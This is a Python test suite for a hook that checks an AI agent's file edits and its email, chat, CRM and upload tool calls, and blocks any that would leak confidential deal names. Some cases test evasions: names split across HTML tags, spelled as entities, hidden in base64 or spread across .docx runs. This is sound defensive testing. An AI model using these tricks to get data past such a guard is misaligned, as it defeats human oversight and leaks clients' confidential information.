    return p.returncode, p.stderr.decode("utf-8", "replace")


# 1) POSITIVE -- the gap itself: context term + trigger present, NO always-term. Must BLOCK,
#    and the block reason must name the CONTEXT term (not the always-term) -- proving the
#    context loop fired, not the always loop.
code, err = run_ctx(write_payload(SITE, "Regional overview: %s identified near %s parcel" % (CTX_CONTEXT, CTX_TRIGGER)))
expect("BLOCK context-only (Phase C): context+trigger, no always-term", 2, code, err)
expect("BLOCK context-only (Phase C): reason names the context term (proves context loop fired)",
       True, CTX_CONTEXT in err and CTX_ALWAYS not in err, err)

# 2) NEGATIVE -- context term alone, no trigger, no always-term. Must ALLOW: proves
#    context_requires_any is genuinely required, not decorative.
code, err = run_ctx(write_payload(SITE, "%s is a common industrial contaminant nationwide" % CTX_CONTEXT))
expect("ALLOW context-only (Phase C): context term alone (no trigger)", 0, code, err)

# 3) NEGATIVE -- trigger alone, no context term, no always-term. Must ALLOW: proves the
#    AND-semantics of the branch (context_requires_any present but no context term => no hit).
code, err = run_ctx(write_payload(SITE, "%s kickoff meeting notes" % CTX_TRIGGER))
expect("ALLOW context-only (Phase C): trigger alone (no context term)", 0, code, err)

# 4) POSITIVE control -- the fixture's always-term still blocks on its own, proving the
#    fixture is live/correctly-shaped (so the exit-0s above are attributable to branch logic,
#    not to an inert or mis-loaded fixture).
code, err = run_ctx(write_payload(SITE, "Press release: %s update" % CTX_ALWAYS))
expect("BLOCK context-only (Phase C): fixture's always-term still blocks (control)", 2, code, err)

# 5) Surface-independence -- re-run case 1's payload on a non-Write egress surface (Notion),
#    confirming the context branch isn't accidentally coupled to the Write path.
code, err = run_ctx(notion_payload(NOTION, "%s identified near %s parcel" % (CTX_CONTEXT, CTX_TRIGGER)))
expect("BLOCK context-only (Phase C): same gap on a non-Write surface (notion-create)", 2, code, err)


# --- load_terms(): linked-worktree fallback to the main checkout's terms file ----------
# 2026-07-12: hooks/confidential-terms.json is gitignored, so `git worktree add` never
# materializes it in a fresh linked worktree -- confidentiality-guard.py's load_terms() must
# fall back to the MAIN worktree's copy (resolved via `git rev-parse --git-common-dir`, which
# always points at the shared .git dir regardless of which worktree asks). Mirrors the
# equivalent test added to test-git-prepush-scan.py, adapted for this guard's
# subprocess-invocation style: it's exec'd as a standalone script, not imported as a module,
# so the repro copies the real (just-edited) guard source into a throwaway git repo rather
# than monkeypatching an imported module's globals.
with tempfile.TemporaryDirectory() as td:
    main_repo = os.path.join(td, "main-repo")
    os.makedirs(os.path.join(main_repo, "hooks"))
    subprocess.run(["git", "init", "-q", main_repo], check=True, env=_clean_env())
    subprocess.run(["git", "-C", main_repo, "config", "user.email", "t@example.com"],
                    check=True, env=_clean_env())
    subprocess.run(["git", "-C", main_repo, "config", "user.name", "t"], check=True, env=_clean_env())
    with open(os.path.join(main_repo, "README.md"), "w") as f:
        f.write("seed\n")
    # confidentiality-guard.py is tracked under hooks/ in the real repo, so it DOES
    # materialize into a linked worktree's checkout -- only confidential-terms.json is
    # gitignored out of it. Copy the actual current guard source so this exercises the
    # real implementation, not a stale hand-written stand-in.
    with open(GUARD, encoding="utf-8") as f:
        guard_src = f.read()
    with open(os.path.join(main_repo, "hooks", "confidentiality-guard.py"), "w", encoding="utf-8") as f:
        f.write(guard_src)
    # hooks/lib/site_markers.py (2026-07-12) is a tracked dependency confidentiality-guard.py
    # now imports at load time -- it must be seeded into this synthetic repo too, exactly
    # like the real one, or the linked-worktree repro below fails for a reason unrelated to
    # what this test actually exercises (the terms-file fallback).
    os.makedirs(os.path.join(main_repo, "hooks", "lib"), exist_ok=True)
    real_lib_dir = os.path.join(os.path.dirname(GUARD), "lib")
    with open(os.path.join(real_lib_dir, "site_markers.py"), encoding="utf-8") as f:
        site_markers_src = f.read()
    with open(os.path.join(main_repo, "hooks", "lib", "site_markers.py"), "w", encoding="utf-8") as f:
        f.write(site_markers_src)
    subprocess.run(
        ["git", "-C", main_repo, "add", "README.md",
         "hooks/confidentiality-guard.py", "hooks/lib/site_markers.py"],
        check=True, env=_clean_env(),
    )
    subprocess.run(["git", "-C", main_repo, "commit", "-q", "-m", "seed"], check=True, env=_clean_env())

    # Never committed -- mirrors the real file being gitignored (present in the main
    # checkout's working tree, absent from anything `git worktree add` creates).
    terms_path = os.path.join(main_repo, "hooks", "confidential-terms.json")
    with open(terms_path, "w", encoding="utf-8") as f:
        json.dump({
            "_meta": {"roster_last_verified": datetime.date.today().isoformat()},
            "worktree_fallback_test_deal": {
                "active": True,
                "label": "Worktree Fallback Test Deal (fixture, not real)",
                "always": ["Wraith Fallback Corp"],
            },
        }, f)

    linked_wt = os.path.join(td, "linked-wt")
    subprocess.run(["git", "-C", main_repo, "worktree", "add", linked_wt, "-b", _unique_branch_name()],
                    check=True, capture_output=True, env=_clean_env())

    linked_terms = os.path.join(linked_wt, "hooks", "confidential-terms.json")
    expect("setup: linked worktree genuinely lacks a local terms file (proves the repro)",
           True, not os.path.isfile(linked_terms))

    linked_guard = os.path.join(linked_wt, "hooks", "confidentiality-guard.py")
    # No CONFIDENTIAL_TERMS_FILE_OVERRIDE here -- must resolve on its own via the fallback,
    # not via the escape hatch the rest of this suite relies on.
    wt_env = dict(os.environ)
    wt_env.pop("CONFIDENTIAL_TERMS_FILE_OVERRIDE", None)

    def run_in_worktree(payload_obj):
        p = subprocess.run([sys.executable, linked_guard], input=json.dumps(payload_obj).encode("utf-8"),
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=wt_env)
        return p.returncode, p.stderr.decode("utf-8", "replace")

    code, err = run_in_worktree(write_payload(SITE, "Press release: Wraith Fallback Corp update"))
    expect("load_terms: falls back to main worktree's terms file (blocks the hit)", 2, code, err)
    # Exit 2 alone doesn't prove the fallback FOUND the deal -- a totally broken (pre-fix)
    # guard also blocks everything with exit 2, just because terms are unreadable everywhere.
    # Require the block reason to name the fixture deal, not a generic unreadable-file error,
    # so this assertion actually discriminates "fallback worked" from "still fail-closed-broken".
    expect("load_terms: block reason names the fixture deal (proves fallback, not blanket fail-closed)",
           True, "Worktree Fallback Test Deal" in err and "unreadable" not in err, err)

    code, err = run_in_worktree(write_payload(SITE, "Columbus industrial market update Q2 2026"))
    expect("load_terms: falls back to main worktree's terms file (allows clean egress)", 0, code, err)

    # Truly missing everywhere (main copy removed too) must still fail closed -- even for a
    # non-egress-shaped payload, since load_terms() is evaluated before the surface check.
    os.remove(terms_path)
    code, err = run_in_worktree({"tool_name": "Read", "tool_input": {}})
    expect("load_terms: missing everywhere -> fails closed (blocks even a non-egress call)", 2, code, err)

# --- BLOCK: site_markers.py import failure must not degrade fail-closed to fail-open ----
# 2026-07-12 code review finding: the module-level `from site_markers import ...` sat
# outside main()'s try/except, so a missing/broken shared module raised at import time and
# exited 1 (non-blocking) -- silently ALLOWING egress instead of blocking it. Fixed with a
# try/except + hardcoded fallback around the import. This proves the fallback actually
# classifies a site path as an egress surface (not just "still exits 2 for some other
# unrelated reason like a missing terms file").
with tempfile.TemporaryDirectory() as td2:
    iso_hooks = os.path.join(td2, "hooks")
    os.makedirs(iso_hooks)  # deliberately NO lib/ subdirectory -- site_markers.py is absent
    with open(GUARD, encoding="utf-8") as f:
        iso_guard_src = f.read()
    iso_guard = os.path.join(iso_hooks, "confidentiality-guard.py")
    with open(iso_guard, "w", encoding="utf-8") as f:
        f.write(iso_guard_src)

    iso_terms = os.path.join(td2, "confidential-terms.json")
    with open(iso_terms, "w", encoding="utf-8") as f:
        json.dump({
            "_meta": {"roster_last_verified": datetime.date.today().isoformat()},
            "site_markers_fallback_test_deal": {
                "active": True,
                "label": "Site Markers Fallback Test Deal (fixture, not real)",
                "always": ["Grommet Fallback Industries"],
            },
        }, f)

    iso_env = dict(os.environ, CONFIDENTIAL_TERMS_FILE_OVERRIDE=iso_terms)
    p = subprocess.run(
        [sys.executable, iso_guard],
        input=json.dumps(write_payload(
            "C:/Users/Owner/website-canonical/src/press.html",
            "Announcing the Grommet Fallback Industries partnership",
        )).encode("utf-8"),
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=iso_env,
    )
    iso_err = p.stderr.decode("utf-8", "replace")
    expect("site_markers import failure: still recognizes the site path as an egress "
           "surface via the hardcoded fallback (blocks the hit)", 2, p.returncode, iso_err)
    expect("site_markers import failure: block reason names the fixture deal (proves the "
           "fallback SITE_MARKERS worked, not a generic/unrelated block)",
           True, "Grommet Fallback Industries" in iso_err, iso_err)

# --- stdin decode: must be explicit UTF-8, not sys.stdin's own (locale-dependent) encoding
# 2026-07-17: eos-claude-md-guard.py had this exact bug -- a harness-spawned hook process
# resolved sys.stdin.encoding to cp1252 (Windows ANSI codepage), silently corrupting any
# non-ASCII byte in the payload before json.loads ever ran. confidentiality-guard.py shares
# the same bare `sys.stdin.read()` pattern. It is NOT exploitable against the live roster
# today (every current term is pure ASCII -- an ASCII term's own byte sequence survives
# cp1252 corruption of OTHER non-ASCII bytes elsewhere in scan_text, verified empirically),
# but it silently defeats the fail-closed leak scanner for ANY future confidential term that
# itself contains a non-ASCII character (an accented name, a curly quote, an em-dash copied
# from Notion/Word) -- exactly the dangerous under-block case this hook's own docstring
# calls out as the one fail-closed cannot catch on its own. Fixed proactively before it bites.
guard_module = _load_guard_module()
expect("guard exposes _read_stdin_text() (explicit UTF-8 decode off sys.stdin.buffer)",
       True, hasattr(guard_module, "_read_stdin_text"))

if hasattr(guard_module, "_read_stdin_text"):
    # ensure_ascii=False is required: the default True would \\u-escape the non-ASCII
    # character into pure ASCII before .encode(), so the payload bytes would never
    # actually contain a multi-byte UTF-8 sequence and this test would pass even against
    # the unfixed sys.stdin.read() -- the exact test-quality defect an adversarial review
    # caught in eos-claude-md-guard.py's first version of this same test.
    nonascii_payload = json.dumps({"probe": "Café Roastery — deal notes"}, ensure_ascii=False)
    utf8_bytes = nonascii_payload.encode("utf-8")

    class _FakeStdin:
        def __init__(self, data):
            self.buffer = io.BytesIO(data)

        def read(self):
            # Emulates the exact live failure mode: text-mode .read() using a
            # non-UTF-8 codepage silently corrupts multi-byte characters instead
            # of raising -- this must NOT be what the fix relies on.
            return self.buffer.getvalue().decode("cp1252")

    real_stdin = sys.stdin
    sys.stdin = _FakeStdin(utf8_bytes)
    try:
        decoded_text = guard_module._read_stdin_text()
    finally:
        sys.stdin = real_stdin
    decoded = json.loads(decoded_text)
    expect("_read_stdin_text() round-trips a non-ASCII confidential-term-shaped string "
           "correctly regardless of sys.stdin's own (locale-dependent) encoding",
           True, decoded.get("probe") == "Café Roastery — deal notes",
           "got %r" % decoded.get("probe"))

# --- BLOCK: end-to-end, a confidential term containing a non-ASCII character must still be
# caught crossing an egress surface. Uses a synthetic terms file (never a real deal
# identifier) since this test is git-tracked. This is defense-in-depth wiring coverage --
# it does not reliably reproduce the cp1252 mis-decode on every dev machine (subprocess
# pipes here happened to decode correctly even before the fix), so it is not proof of the
# fix by itself; the direct _read_stdin_text() unit test above is the primary regression
# guard.
nonascii_terms_path = _write_synthetic_terms_file()
with open(nonascii_terms_path, encoding="utf-8") as f:
    nonascii_terms_data = json.load(f)
nonascii_terms_data["synthetic_test_deal"]["always"].append("Café Roastery Holdings")
with open(nonascii_terms_path, "w", encoding="utf-8") as f:
    json.dump(nonascii_terms_data, f, ensure_ascii=False)

nonascii_env = dict(os.environ, CONFIDENTIAL_TERMS_FILE_OVERRIDE=nonascii_terms_path)
nonascii_payload_raw = json.dumps(
    write_payload(SITE, "Announcing the Café Roastery Holdings partnership"),
    ensure_ascii=False,
)
p_nonascii = subprocess.run(
    [sys.executable, GUARD], input=nonascii_payload_raw.encode("utf-8"),
    stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=nonascii_env,
)
nonascii_err = p_nonascii.stderr.decode("utf-8", "replace")
expect("BLOCK egress write containing a non-ASCII confidential term (end-to-end)",
       2, p_nonascii.returncode, nonascii_err)

# --- Edit seams (2026-09-24): a term created where the edit joins existing text ----------
# The guard applies Edit/MultiEdit to the file's current text and scans each seam. These use a
# REAL file under a site-marker path, because the seam only exists against on-disk text. A1 is a
# live or synthetic always-term; it is split in two around a filler the edit removes.
SEAM_DIR = os.path.join(tempfile.mkdtemp(prefix="seam-"), "website-canonical")
os.makedirs(SEAM_DIR)
atexit.register(lambda: __import__("shutil").rmtree(os.path.dirname(SEAM_DIR), ignore_errors=True))
_cut = max(1, len(A1) // 2)
HEAD, TAIL = A1[:_cut], A1[_cut:]


def seam_file(name, text, newline="\n"):
    p = os.path.join(SEAM_DIR, name)
    with open(p, "w", encoding="utf-8", newline=newline) as f:
        f.write(text)
    return p


def edit(path, old, new, replace_all=False):
    return {"tool_name": "Edit", "tool_input": {"file_path": path, "old_string": old,
                                                "new_string": new, "replace_all": replace_all}}


def multi(path, pairs):
    return {"tool_name": "MultiEdit", "tool_input": {"file_path": path, "edits": [
        {"old_string": o, "new_string": n} for o, n in pairs]}}


split = seam_file("split.html", "<p>Welcome to %sQQZX%s today.</p>\n" % (HEAD, TAIL))
expect("BLOCK seam: delete-only Edit joins a split always-term", 2,
       *run(edit(split, "QQZX", "")))
expect("BLOCK seam: non-empty new_string completes a term it does not contain", 2,
       *run(edit(split, "QQZX" + TAIL[:1], TAIL[:1])))
expect("BLOCK seam: MultiEdit's second edit joins the term", 2,
       *run(multi(split, [("Welcome", "Hello"), ("QQZX", "")])))
twice = seam_file("twice.html", "<p>%sQQZX%s</p><p>clean QQZX text</p>\n" % (HEAD, TAIL))
expect("BLOCK seam: replace_all deletion joins the term at one of two sites", 2,
       *run(edit(twice, "QQZX", "", replace_all=True)))
crlf = seam_file("crlf.html", "<p>Welcome to %sQQZX%s\ntoday.</p>\n" % (HEAD, TAIL), newline="\r\n")
expect("BLOCK seam: LF old_string against a CRLF file still joins the term", 2,
       *run(edit(crlf, "QQZX%s\ntoday" % TAIL, "%s\ntoday" % TAIL)))
clean = seam_file("clean.html", "<p>Columbus industrial market update</p>\n<p>stale line</p>\n")
expect("ALLOW seam: delete-only Edit on clean site text (was a fail-closed false alarm)", 0,
       run(edit(clean, "<p>stale line</p>\n", ""))[0])
expect("ALLOW seam: delete-only Edit on a clean CRLF file", 0,
       run(edit(seam_file("clean-crlf.html", "<p>a</p>\n<p>b</p>\n", newline="\r\n"), "<p>b</p>\n", ""))[0])
expect("ALLOW explicit empty Write to a site file", 0, run(write_payload(SITE, ""))[0])
expect("BLOCK seam: delete-only Edit whose old_string is not in the file (cannot simulate)", 2,
       run(edit(clean, "not present anywhere", ""))[0])
expect("BLOCK seam: delete-only Edit on a file that does not exist", 2,
       run(edit(os.path.join(SEAM_DIR, "missing.html"), "x", ""))[0])
expect("BLOCK seam: delete-only Edit whose target is a directory", 2,
       run(edit(SEAM_DIR, "x", ""))[0])
# With no active deal the seam windows are empty strings, so this is the case where "the edit was
# simulated" alone must carry the ALLOW. It is also the live state whenever the roster is empty.
_inactive_fd, INACTIVE_TERMS = tempfile.mkstemp(prefix="inactive-terms-", suffix=".json")
with os.fdopen(_inactive_fd, "w", encoding="utf-8") as f:
    json.dump({"_meta": {"roster_last_verified": datetime.date.today().isoformat()},
               "closed_deal": {"active": False, "label": "closed fixture", "always": ["Zephyr Corp Portfolio"]}}, f)
atexit.register(lambda: os.path.exists(INACTIVE_TERMS) and os.remove(INACTIVE_TERMS))
_p = subprocess.run([sys.executable, GUARD], input=json.dumps(edit(clean, "<p>stale line</p>\n", "")).encode("utf-8"),
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                    env=dict(os.environ, CONFIDENTIAL_TERMS_FILE_OVERRIDE=INACTIVE_TERMS))
expect("ALLOW seam: delete-only Edit on a site file when no deal is active (empty windows)", 0,
       _p.returncode, _p.stderr.decode("utf-8", "replace"))
# Round-2 cases (merge-gate review of 2a939b6). FILLER is wider than any seam window (2*term+8), so
# a case that needs the far site/trigger to be OUTSIDE the first window really puts it there.
FILLER = "<p>" + "clean filler text " * 150 + "</p>\n"
expect("BLOCK seam: delete-only Edit also removes the following newline, joining two lines", 2,
       *run(edit(seam_file("nl.html", "<p>%sQQZX\n%s</p>\n" % (HEAD, TAIL)), "QQZX", "")))
far = seam_file("far.html", "<p>QQZX</p>\n" + FILLER + "<p>%sQQZX%s</p>\n" % (HEAD, TAIL))
expect("BLOCK seam: replace_all joins the term only at the SECOND site, far from the first", 2,
       *run(edit(far, "QQZX", "", replace_all=True)))
many = seam_file("many.html", ("<p>aQQZXb</p>\n" + FILLER) * 3 + "<p>%sQQZX%s</p>\n" % (HEAD, TAIL[1:]))
expect("BLOCK seam: replace_all with a 1-char new_string completes the term at the LAST of 4 sites", 2,
       *run(edit(many, "QQZX", TAIL[:1], replace_all=True)))
expect("BLOCK seam: term split after its FIRST character", 2,
       *run(edit(seam_file("a1.html", "<p>%sQQZX%s</p>\n" % (A1[:1], A1[1:])), "QQZX", "")))
expect("BLOCK seam: term split before its LAST character", 2,
       *run(edit(seam_file("a2.html", "<p>%sQQZX%s</p>\n" % (A1[:-1], A1[-1:])), "QQZX", "")))
crlf2 = seam_file("crlf2.html", "<p>x</p>\n<p>%sQQZX%s</p>\n" % (HEAD, TAIL), newline="\r\n")
expect("BLOCK seam: CRLF old_string against a CRLF file, non-empty new_string completes the term", 2,
       *run(edit(crlf2, "</p>\r\n<p>%sQQZX" % HEAD, "</p>\r\n<p>%s" % HEAD)))
code, err = run_ctx(edit(seam_file("ctx.html", "<h1>%s</h1>\n" % CTX_TRIGGER + FILLER
                                   + "<p>%sQQZX%s</p>\n" % (CTX_CONTEXT[:5], CTX_CONTEXT[5:])), "QQZX", ""))
expect("BLOCK seam: context term formed at the seam, its trigger far away on the same page", 2, code, err)
code, err = run_ctx(edit(seam_file("ctx2.html", "<h1>no trigger here</h1>\n" + FILLER
                                   + "<p>%sQQZX%s</p>\n" % (CTX_CONTEXT[:5], CTX_CONTEXT[5:])), "QQZX", ""))
expect("ALLOW seam: context term formed at the seam with no trigger anywhere in the file", 0, code, err)
# The Edit tool folds curly/straight quotes, decodes \uXXXX, reads UTF-16 by BOM and handles files
# past our size cap, so "old_string not found" against an EXISTING file must block, not fall back.
quoted = seam_file("quoted.html", "<p>%s“Q”%s</p>\n" % (HEAD, TAIL))
expect("BLOCK seam: old_string only matches via quote folding (existing file, cannot simulate)", 2,
       run(edit(quoted, '"Q"', "x"))[0])
utf16 = os.path.join(SEAM_DIR, "utf16.html")
with open(utf16, "wb") as f:
    f.write(b"\xff\xfe" + ("<p>%sQQZX%s</p>\n" % (HEAD, TAIL)).encode("utf-16-le"))
expect("BLOCK seam: UTF-16 file (read by BOM in the tool, not simulated here)", 2,
       run(edit(utf16, "QQZX" + TAIL[:1], TAIL[:1]))[0])
badbytes = os.path.join(SEAM_DIR, "badbytes.html")
with open(badbytes, "wb") as f:
    f.write(b"<p>caf\xe9</p>\n" + ("<p>%sQQZX%s</p>\n" % (HEAD, TAIL)).encode("utf-8"))
expect("BLOCK seam: non-UTF-8 byte elsewhere in the file, new_string completes the term", 2,
       run(edit(badbytes, "QQZX" + TAIL[:1], TAIL[:1]))[0])
expect("ALLOW Edit that creates a NEW site file (nothing on disk to simulate), clean content", 0,
       run(edit(os.path.join(SEAM_DIR, "brand-new.html"), "", "<p>Columbus flex space</p>"))[0])
expect("BLOCK MultiEdit with a non-dict entry carrying a term", 2,
       run({"tool_name": "MultiEdit", "tool_input": {"file_path": clean, "edits": [
           "%s" % A1, {"old_string": "<p>stale line</p>\n", "new_string": ""}]}})[0])
expect("BLOCK (exit 2, not a crash) Edit whose file_path is not a string", 2,
       run({"tool_name": "Edit", "tool_input": {"file_path": 5, "old_string": "a", "new_string": "b"}})[0])
expect("BLOCK (exit 2, not a crash) MultiEdit whose edits is an int", 2,
       run({"tool_name": "MultiEdit", "tool_input": {"file_path": clean, "edits": 5}})[0])
_bad_fd, BAD_ROSTER = tempfile.mkstemp(prefix="malformed-terms-", suffix=".json")
with os.fdopen(_bad_fd, "w", encoding="utf-8") as f:
    json.dump({"_meta": {"roster_last_verified": datetime.date.today().isoformat()},
               "d": {"active": True, "label": "malformed fixture", "always": [5, "Zephyr Corp Portfolio"]}}, f)
atexit.register(lambda: os.path.exists(BAD_ROSTER) and os.remove(BAD_ROSTER))
_bad_env = dict(os.environ, CONFIDENTIAL_TERMS_FILE_OVERRIDE=BAD_ROSTER)
for _label, _payload, _want in [
        ("BLOCK malformed roster entry: site write carrying the term still blocks (no crash)",
         write_payload(SITE, "Press: Zephyr Corp Portfolio"), 2),
        ("ALLOW malformed roster entry: clean delete-only Edit (no crash)",
         edit(clean, "<p>stale line</p>\n", ""), 0)]:
    _p = subprocess.run([sys.executable, GUARD], input=json.dumps(_payload).encode("utf-8"),
                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=_bad_env)
    expect(_label, _want, _p.returncode, _p.stderr.decode("utf-8", "replace"))
expect("BLOCK Write with no content key at all", 2,
       run({"tool_name": "Write", "tool_input": {"file_path": SITE}})[0])

# --- Live M365 / HubSpot send surfaces (2026-09-30) ------------------------------------------
# The Outlook entry in settings.json was written for the Composio era (OUTLOOK_SEND_EMAIL etc.,
# UPPERCASE). Composio is gone; the live connector's tools are lowercase, and the guard's own
# OUTLOOK_SEND regex missed the reply drafts, update_draft and the calendar tools. Every payload
# below is shaped like the live tool's schema, with the term in a field the tool actually sends.
import base64, re, zipfile  # noqa: E402 -- section-local, keeps the diff to this block


def expect_eq(label, want, got):
    """expect() for non-exit-code values (its failure line formats with %d)."""
    ok = (got == want)
    results.append((ok, label))
    if not ok:
        print("  FAIL: %s  (expected %r, got %r)" % (label, want, got))


M365 = "mcp__c0ea3c01-b8f1-4371-aa06-08a1449f59fc__"
HUBSPOT = "mcp__a3e380ce-2ea9-4b42-92d9-37c588a4b760__"
_WHEN = {"dateTime": "2026-10-01T10:00:00", "timeZone": "Eastern Standard Time"}
SEND_TOOLS = {
    M365 + "outlook_send_mail": lambda t: {"to": ["broker@example.com"], "subject": "Update", "body": t},
    # send_draft carries only an id (content-by-reference, see residual risk in the guard); the
    # case proves the payload IS routed through the scan, whatever field a term arrives in.
    M365 + "outlook_send_draft": lambda t: {"messageId": "AAMkAD1", "note": t},
    M365 + "outlook_forward_mail": lambda t: {"messageId": "AAMkAD1", "to": ["b@example.com"], "comment": t},
    M365 + "outlook_create_draft": lambda t: {"to": ["b@example.com"], "subject": t, "body": "see below"},
    M365 + "outlook_create_reply_draft": lambda t: {"messageId": "AAMkAD1", "body": "<p>%s</p>" % t,
                                                    "bodyType": "html"},
    M365 + "outlook_create_reply_all_draft": lambda t: {"messageId": "AAMkAD1", "comment": t},
    M365 + "outlook_update_draft": lambda t: {"messageId": "AAMkAD1", "body": t, "bodyType": "text"},
    M365 + "outlook_create_event": lambda t: {"subject": "Site tour", "start": _WHEN, "end": _WHEN,
                                              "attendees": [{"email": "b@example.com"}], "body": t},
    M365 + "outlook_update_event": lambda t: {"eventId": "AAMkAD1", "location": t},
    M365 + "outlook_respond_to_event": lambda t: {"eventId": "AAMkAD1", "response": "decline", "comment": t},
    # live schema: {eventId (required), comment (max 1024, plain text)}; the comment is INCLUDED IN THE
    # CANCELLATION EMAIL to attendees when the user is the organizer
    M365 + "outlook_delete_event": lambda t: {"eventId": "AAMk1", "comment": t},
    M365 + "outlook_set_vacation": lambda t: {"status": "alwaysEnabled", "internalReplyMessage": "Away",
                                              "externalAudience": "all", "externalReplyMessage": t},
    M365 + "teams_send_chat_message": lambda t: {"chatId": "19:abc@thread.v2", "body": t},
    M365 + "teams_send_channel_message": lambda t: {"teamId": "g1", "channelId": "19:c@thread.tacv2", "body": t},
    M365 + "teams_reply_channel_message": lambda t: {"teamId": "g1", "channelId": "19:c@thread.tacv2",
                                                     "messageId": "1", "body": t},
    M365 + "teams_create_chat": lambda t: {"chatType": "group", "members": ["a@example.com", "b@example.com"],
                                           "topic": t},
    M365 + "sharepoint_upload_file": lambda t: {"driveId": "b!x", "filename": "memo.txt", "content": t},
    M365 + "sharepoint_update_file": lambda t: {"driveId": "b!x", "itemId": "01AB", "content": t},
    HUBSPOT + "manage_crm_objects": lambda t: {"objectType": "deals", "operations": [
        {"operationType": "UPDATE", "properties": {"dealname": t}}]},
    HUBSPOT + "manage_blog_post": lambda t: {"operation": {"postBody": "<p>%s</p>" % t}},
    HUBSPOT + "manage_landing_page": lambda t: {"operation": {"htmlTitle": t}},
    HUBSPOT + "manage_website_page": lambda t: {"operation": {"htmlTitle": t}},
    HUBSPOT + "manage_campaign_objects": lambda t: {"operationType": "CAMPAIGN_CREATE",
                                                    "createRequest": {"displayName": t}},
    HUBSPOT + "manage_segment": lambda t: {"operation": {"type": "CreateStaticSegmentOperation",
                                                         "name": t, "objectType": "CONTACT"}},
    HUBSPOT + "manage_aeo_prompts": lambda t: {"operation": {"_operationType": "CREATE", "businessUnitId": 1,
                                                             "promptTexts": [t]}},
    # public social channels (audit finding 2026-11-08); live schema: action/channelId/content/...
    HUBSPOT + "manage_social_posts": lambda t: {"action": "CREATE", "channelId": "c1", "content": t},
    "mcp__c5f4869f-7d3a-4472-a66a-8e61315feb51__notion-send-message-to-session":
        lambda t: {"session_url": "session://s1", "message": t},
    "mcp__c5f4869f-7d3a-4472-a66a-8e61315feb51__notion-spawn-session":
        lambda t: {"agent_url": "agent://w/a1", "initial_message": t},
}
for i, (tool, mk) in enumerate(sorted(SEND_TOOLS.items())):
    short = tool.rsplit("__", 1)[1]
    v = VARIANTS[i % len(VARIANTS)]
    code, err = run({"tool_name": tool, "tool_input": mk("Re: " + v + " next steps")})
    expect("BLOCK live send surface %s :: variant#%d" % (short, i % len(VARIANTS)), 2, code, err)
    code, err = run({"tool_name": tool, "tool_input": mk("Columbus flex portfolio update")})
    expect("ALLOW live send surface %s, clean payload" % short, 0, code, err)

# Read-only / non-content tools: a term in their payload is a QUERY, not egress. They must not be
# classified as send surfaces, and a payload carrying a term must pass.
READ_ONLY_TOOLS = {
    M365 + "outlook_email_search": {"query": None},
    M365 + "outlook_calendar_search": {"query": None},
    M365 + "teams_list_chats": {"filter": None},
    M365 + "teams_list_channels": {"teamId": None},
    M365 + "teams_list_channel_messages": {"teamId": "g1", "channelId": None},
    M365 + "chat_message_search": {"query": None},
    M365 + "sharepoint_search": {"query": None},
    M365 + "sharepoint_folder_search": {"query": None},
    M365 + "read_resource": {"uri": None},
    HUBSPOT + "get_crm_objects": {"objectType": "deals", "query": None},
    HUBSPOT + "query_crm_data": {"query": None},
    HUBSPOT + "search_crm_objects": {"query": None},
    HUBSPOT + "manage_saved_reports": {"action": "LIST", "search": None},
    HUBSPOT + "manage_aeo_recommendations": {"operation": {"_operationType": "LIST", "q": None}},
    HUBSPOT + "manage_onboarding": {"action": None},
}
_guard_mod = _load_guard_module()
for tool, shape in sorted(READ_ONLY_TOOLS.items()):
    short = tool.rsplit("__", 1)[1]
    ti = json.loads(json.dumps(shape).replace("null", json.dumps(A1)))
    expect("ALLOW read-only %s carrying a term (not an egress surface)" % short, 0,
           *run({"tool_name": tool, "tool_input": ti}))
    expect_eq("read-only %s is NOT classified as a send surface" % short, None,
           _guard_mod.classify_tool(tool) if hasattr(_guard_mod, "classify_tool") else "no classify_tool")
for tool in sorted(SEND_TOOLS):
    expect_eq("%s IS classified as a send surface" % tool.rsplit("__", 1)[1], True,
           bool(getattr(_guard_mod, "classify_tool", lambda _t: None)(tool)))
# Content-bearing but EXCLUDED by design (content travels by reference or out of band; see the
# comment above MCP_SEND_SURFACES). Pinned so a change to these decisions is deliberate.
EXCLUDED_BY_DESIGN = [
    "mcp__c5f4869f-7d3a-4472-a66a-8e61315feb51__notion-upload-skill",
    HUBSPOT + "import-claude-design-from-url",
    M365 + "outlook_create_filter",
    M365 + "sharepoint_rename_item",
    M365 + "sharepoint_create_folder",
    # other delete_* stay housekeeping (only delete_event mails free text to attendees)
    M365 + "sharepoint_delete_item",
    M365 + "outlook_delete_item",
    M365 + "outlook_trash_thread",
]
for tool in EXCLUDED_BY_DESIGN:
    expect_eq("excluded-by-design %s is not classified" % tool.rsplit("__", 1)[1], None,
              getattr(_guard_mod, "classify_tool", lambda _t: None)(tool))

# Obfuscation that the receiving service undoes: HTML bodies are rendered (tags split a name,
# entities spell it), attachments / uploads arrive base64-encoded, and Office files are zips of XML
# whose runs split a name mid-word. The scan has to see what the RECIPIENT sees.
_mid = max(1, len(A1) // 2)
code, err = run({"tool_name": M365 + "outlook_send_mail", "tool_input": {
    "to": ["b@example.com"], "subject": "Update", "bodyType": "html",
    "body": "<p>%s<b></b>%s</p>" % (A1[:_mid], A1[_mid:])}})
expect("BLOCK outlook_send_mail: term split by an empty HTML tag", 2, code, err)
code, err = run({"tool_name": M365 + "teams_send_chat_message", "tool_input": {
    "chatId": "19:a@thread.v2", "bodyType": "html", "body": "&#%d;%s" % (ord(A1[0]), A1[1:])}})
expect("BLOCK teams_send_chat_message: first character spelled as an HTML entity", 2, code, err)
code, err = run({"tool_name": M365 + "sharepoint_upload_file", "tool_input": {
    "driveId": "b!x", "filename": "memo.txt",
    "contentBase64": base64.b64encode(("Memo: %s closing" % A1).encode("utf-8")).decode("ascii")}})
expect("BLOCK sharepoint_upload_file: term inside contentBase64", 2, code, err)
_zbuf = io.BytesIO()
with zipfile.ZipFile(_zbuf, "w") as _z:
    _z.writestr("[Content_Types].xml", "<Types/>")
    _z.writestr("word/document.xml", "<w:document><w:p><w:r><w:t>%s</w:t></w:r><w:r><w:t>%s</w:t></w:r>"
                "</w:p></w:document>" % (A1[:_mid], A1[_mid:]))
code, err = run({"tool_name": M365 + "sharepoint_update_file", "tool_input": {
    "driveId": "b!x", "itemId": "01AB", "contentBase64": base64.b64encode(_zbuf.getvalue()).decode("ascii")}})
expect("BLOCK sharepoint_update_file: .docx whose runs split the term", 2, code, err)
